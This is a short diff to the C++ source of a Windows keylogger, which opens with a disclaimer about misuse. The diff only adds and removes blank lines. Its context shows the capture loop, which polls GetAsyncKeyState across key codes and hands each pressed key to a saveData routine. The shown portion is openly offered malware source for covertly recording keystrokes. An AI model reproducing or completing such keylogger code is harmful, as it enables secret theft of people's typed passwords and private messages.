@@ -21,7 +21,6 @@ Warning: I am NOT responsible for ANY misuse of this product
 #include <winuser.h>
 #include <bits/stdc++.h>
 
-
 //Define namespace & avoid errors
 //Yes ik it's bad practice
 using namespace std; 
@@ -95,6 +94,7 @@ void Keylogger(){
         for(int key = 8; key <= 190; key++) {
             if (GetAsyncKeyState(key) == -32767){
                 //once we get the key input we should verify if it's a special character
+
                 saveData(std::string(1, (char)std::tolower(key)));
             }
         }
